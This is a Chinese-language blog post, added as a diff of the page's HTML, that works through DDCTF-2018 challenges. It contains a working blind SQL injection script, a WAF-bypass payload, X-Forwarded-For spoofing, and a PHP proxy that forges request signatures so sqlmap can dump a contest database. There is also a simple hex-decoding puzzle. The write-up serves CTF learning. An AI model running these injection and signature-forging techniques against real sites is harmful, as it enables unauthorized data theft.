@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="Web数据库的秘密打开链接提示非法链接，只允许来自 123.232.23.245 的访问，于是添加 X-Forwarded-For 字段，尝试了 Burp 的 Bwapass Waf 插件，还是感觉火狐的 Mdify Headers 好用。 进入页面之后，发现是一个查询文章的功能，结合题目判断是一道 sqli。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF-2018 Writeup">
+<meta property="og:url" content="https://jlkl.github.io/2018/04/20/Web_06/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="Web数据库的秘密打开链接提示非法链接，只允许来自 123.232.23.245 的访问，于是添加 X-Forwarded-For 字段，尝试了 Burp 的 Bwapass Waf 插件，还是感觉火狐的 Mdify Headers 好用。 进入页面之后，发现是一个查询文章的功能，结合题目判断是一道 sqli。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/5ji7uu0bqccjtf17qp67x8wyd5.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/mym3l3ndwg8bm2gcgjluu9qwwx.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/49l82d08982glkhvyet09t8qqt.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/z0ku09g006rh32yyqqpuvrwb9m.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/bgti2ljaq2p4x3obz1yt5i639p.png">
+<meta property="article:published_time" content="2018-04-19T23:32:28.000Z">
+<meta property="article:modified_time" content="2020-01-27T09:13:17.210Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/5ji7uu0bqccjtf17qp67x8wyd5.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2018/04/20/Web_06/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>DDCTF-2018 Writeup | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">32</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2018/04/20/Web_06/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DDCTF-2018 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-04-20 07:32:28" itemprop="dateCreated datePublished" datetime="2018-04-20T07:32:28+08:00">2018-04-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-01-27 17:13:17" itemprop="dateModified" datetime="2020-01-27T17:13:17+08:00">2020-01-27</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2018/04/20/Web_06/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/04/20/Web_06/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>4.7k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h3><p>打开链接提示<code>非法链接，只允许来自 123.232.23.245 的访问</code>，于是添加 X-Forwarded-For 字段，尝试了 Burp 的 Bwapass Waf 插件，还是感觉火狐的 Mdify Headers 好用。</p>
+<p>进入页面之后，发现是一个查询文章的功能，结合题目判断是一道 sqli。</p>
+<a id="more"></a>
+<p>利用 Burp 显示隐藏内容的功能，发现在表单中还有一个名字为 author 的字段。</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/5ji7uu0bqccjtf17qp67x8wyd5.png" alt></p>
+<p>查询的大概流程为，根据表单的内容加密后的密文，在请求后添加 sig 和 time 参数，sig 参数判断 post 内容是否被修改，time 是一个时间戳，通过这个判定和服务器时间相隔一定时间的请求有效。</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/mym3l3ndwg8bm2gcgjluu9qwwx.png" alt></p>
+<p>解密后的前端加密脚本如下，hex_math_enc 是 math.js 的一个函数。</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/49l82d08982glkhvyet09t8qqt.png" alt></p>
+<p>接下来寻找注入点，id 只允许输入数字，title,data 转义了 ‘ ，尝试了好像没有宽字节注入，发现这个隐藏的 author 没有过滤 ‘ ，注入点就在这里了。</p>
+<p>发现以下内容会被 waf 拦截</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span></span></span><br><span class="line">and <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">or <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+
+<p>很迷的一个 waf ，如果只是输入单个单词的话，不会被拦截，前面出现了 or ，后面再出现 = 就会被拦截，试了下用 || 不会被拦截，得到 payload :<code>0&#39; || 1#</code></p>
+<p>是一个盲注，查询成功返回表中所有内容，于是编写脚本，爆数据库的时候，因为过滤了 database() ，可以用<code>select schema_name from information_schema.schemata</code>的方式。</p>
+<p>编写脚本有一个难点是根据 payload 构造 sig 和 time 标记，这里有两个思路，第一种根据 javascript 代码编写加密脚本，第二种利用原来的 javascript 来加密，然后再读取。</p>
+<p>采用了第二种思路，遇到了一个问题，读取原生 js 加密数据时，通过网页传参返回显然是行不通的，因为 js 脚本是在服务端执行的，直接读取网页返回的是 js 的源代码。py了一份 sn00py 师傅的代码，大师傅的思路是用 selenium 调用浏览器访问网页，达到执行 js 代码的目的。</p>
+<p>根据师傅的代码修改的脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> HTMLParser</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">"--disable_gpu"</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">"--window-size=1920,1080"</span>)</span><br><span class="line">chrome_options.binary_location = <span class="string">r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</span></span><br><span class="line">driver_path = <span class="string">r"C:\Program Files (x86)\Google\Chrome\Application\chromedriver_win32\chromedriver.exe"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    d = webdriver.Chrome(</span><br><span class="line">        executable_path=driver_path,</span><br><span class="line">        chrome_options=chrome_options</span><br><span class="line">    )</span><br><span class="line">    d.implicitly_wait(<span class="number">30</span>)</span><br><span class="line">    d.set_page_load_timeout(<span class="number">30</span>)</span><br><span class="line">    local = <span class="string">r"D:\phpStudy\WWW\ctf\encode.html"</span></span><br><span class="line">    temp = <span class="string">r"D:\phpStudy\WWW\ctf\temp.html"</span></span><br><span class="line">    <span class="keyword">with</span> open(temp) <span class="keyword">as</span> temp_cont:</span><br><span class="line">        content = temp_cont.read() % payload</span><br><span class="line">    temp_cont.close()</span><br><span class="line">    <span class="keyword">with</span> open(local, <span class="string">'w+'</span>) <span class="keyword">as</span> encode_cont:</span><br><span class="line">        encode_cont.write(content)</span><br><span class="line">    encode_cont.close()</span><br><span class="line">    d.get(local)</span><br><span class="line">    <span class="comment"># print d.page_source</span></span><br><span class="line">    key = re.search(<span class="string">r"sig=[a-zA-Z0-9]+&amp;amp;time=[a-zA-Z0-9]+"</span>, d.page_source)</span><br><span class="line">    <span class="comment"># print key.group(0)</span></span><br><span class="line">    html_parser = HTMLParser.HTMLParser()</span><br><span class="line">    key = html_parser.unescape(key.group(<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># print key</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">()</span>:</span></span><br><span class="line">    flag = []</span><br><span class="line">    url1 = <span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?%s"</span></span><br><span class="line">    payload1 = <span class="string">"0'|| (ascii(substring((select secvalue from ctf_key9 limit 0,1),%s,1)))=%s#"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> flag_len <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"num %s"</span> % flag_len,</span><br><span class="line">        <span class="keyword">for</span> ascii <span class="keyword">in</span> range(<span class="number">68</span>,<span class="number">127</span>):</span><br><span class="line">            payload = payload1 % (flag_len,ascii)</span><br><span class="line">            <span class="comment"># print payload</span></span><br><span class="line">            tag = encode(payload)</span><br><span class="line">            url = url1 % tag</span><br><span class="line">            <span class="comment"># print url</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span> : <span class="string">''</span>,</span><br><span class="line">                <span class="string">'title'</span> : <span class="string">''</span>,</span><br><span class="line">                <span class="string">'date'</span> : <span class="string">''</span>,</span><br><span class="line">                <span class="string">'author'</span> : payload,</span><br><span class="line">                <span class="string">'button'</span> : <span class="string">'search'</span></span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'X-Forwarded-For'</span> : <span class="string">'123.232.23.245'</span></span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url = url, data = data, headers = headers)</span><br><span class="line">            <span class="comment"># print res.text</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag.append(chr(ascii))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sqli()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<code>DDCTF{IKIDLHNZMKFUDEQE}</code></p>
+<p>这里再分享看到的一个很新奇的思路(via@Clannad)，通过写 php 脚本代理访问的方式，直接用 sqlmap 秒出 flag</p>
+<p>代理脚本:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">@$id = $_REQUEST[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">@$title = $_REQUEST[<span class="string">'title'</span>];</span></span><br><span class="line"><span class="php">@$author = $_REQUEST[<span class="string">'author'</span>];</span></span><br><span class="line"><span class="php">@$date = $_REQUEST[<span class="string">'date'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php">$sig = sha1(<span class="string">'id='</span>.$id.<span class="string">'title='</span>.$title.<span class="string">'author='</span>.$author.<span class="string">'date='</span>.$date.<span class="string">'time='</span>.$time.<span class="string">'adrefkfweodfsdpiru'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$ch = curl_init();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$post = [</span></span><br><span class="line"><span class="php">    <span class="string">'id'</span> =&gt; $id,</span></span><br><span class="line"><span class="php">    <span class="string">'title'</span> =&gt; $title,</span></span><br><span class="line"><span class="php">    <span class="string">'author'</span> =&gt; $author,</span></span><br><span class="line"><span class="php">    <span class="string">'date'</span> =&gt; $date,</span></span><br><span class="line"><span class="php">];</span></span><br><span class="line"></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_URL,<span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig=$sig&amp;time=$time"</span>);</span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'X-Forwarded-For: 123.232.23.245'</span>,</span></span><br><span class="line"><span class="php">    ));</span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_POSTFIELDS, $post);</span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">true</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$ch_out = curl_exec($ch);</span></span><br><span class="line"><span class="php">$ch_info = curl_getinfo($ch);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$header = substr($ch_out, <span class="number">0</span>, $ch_info[<span class="string">'header_size'</span>]);</span></span><br><span class="line"><span class="php">$body = substr($ch_out, $ch_info[<span class="string">'header_size'</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="php">http_response_code($ch_info[<span class="string">'http_code'</span>]);</span></span><br><span class="line"><span class="php"><span class="comment">//header($header);</span></span></span><br><span class="line"><span class="php"><span class="comment">//echo $header;</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $body;</span></span><br></pre></td></tr></table></figure>
+
+<p>sqlmap 一把梭: <code>sqlmap -u http://127.0.0.1/ctf/proxy.php?author=admin --dump</code></p>
+<p>秒出 flag，震惊~<br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/z0ku09g006rh32yyqqpuvrwb9m.png" alt></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h3><p>题目只给了一串16进制数</p>
+<p><code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</code></p>
+<p>每两位转换成10进制数后范围在 160<del>280 ，可见10进制 ascii 码范围在 20</del>126 ，猜测可能是由 ascii 加上固定值得到，于是编写脚本试了下：</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span></span><br><span class="line"></span><br><span class="line">ascii = <span class="string">"d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd"</span></span><br><span class="line">y = bytearray.fromhex(ascii)</span><br><span class="line"><span class="keyword">new</span><span class="type">list1</span> = list(y)</span><br><span class="line"><span class="keyword">new</span><span class="type">list2</span> = list(y)</span><br><span class="line"><span class="meta"># print z</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">141</span>):<span class="type"></span></span><br><span class="line"><span class="type">	for j in range</span>(len(<span class="keyword">new</span><span class="type">list1</span>)):<span class="type"></span></span><br><span class="line"><span class="type">		newlist2</span>[j] = int(<span class="keyword">new</span><span class="type">list1</span>[j]) - i</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">new</span><span class="type">list2</span>:</span><br><span class="line">		print chr(int(k)),</span><br><span class="line">	print <span class="string">""</span></span><br></pre></td></tr></table></figure>
+
+<p>得到一串字符：<code>That was fast!The flag is:DDCTF{922ab9974a47cd322cf43b50610faea5}</code></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>成绩依旧很差的一次比赛，认识到了自身的不足，还是继续踏踏实实前进吧。<br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/bgti2ljaq2p4x3obz1yt5i639p.png" alt></p>
+<p>参考链接：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Clannad sqlmap 代理：<span class="string">https:</span><span class="comment">//clannad.me/ddctf.md.html</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>要一直努力做最好的自己</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2018/04/20/Web_06/" title="DDCTF-2018 Writeup">https://jlkl.github.io/2018/04/20/Web_06/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/04/07/Reverse_01/" rel="prev" title="Plants vs Zombies 阳光修改器">
+      <i class="fa fa-chevron-left"></i> Plants vs Zombies 阳光修改器
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/05/15/Python_01/" rel="next" title="Python学习笔记">
+      Python学习笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库的秘密"><span class="nav-number">1.1.</span> <span class="nav-text">数据库的秘密</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#╯°□°）╯︵-┻━┻"><span class="nav-number">2.1.</span> <span class="nav-text">(╯°□°）╯︵ ┻━┻</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
